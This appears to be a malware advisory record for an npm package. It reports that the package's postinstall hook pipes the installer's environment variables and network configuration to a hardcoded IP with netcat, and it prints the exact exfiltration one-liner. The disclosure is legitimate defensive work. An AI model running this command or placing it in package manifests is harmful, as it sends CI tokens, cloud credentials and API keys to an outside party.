summary: postinstall exfiltrates environment variables and network configuration to hardcoded remote IP
details: The package.json postinstall hook runs automatically on npm install and executes `(env; ip addr) | nc 49.13.60.225 888`, piping the installer's full process environment and network interface configuration to a hardcoded bare IP over an unencrypted netcat connection. The shipped source files (src/index.ts, src/plugin.ts) are empty — the manifest's postinstall command is the entire payload. Any secrets present in the installer's environment at install time (CI tokens, cloud credentials, npm publish tokens, API keys) are transmitted to the remote endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
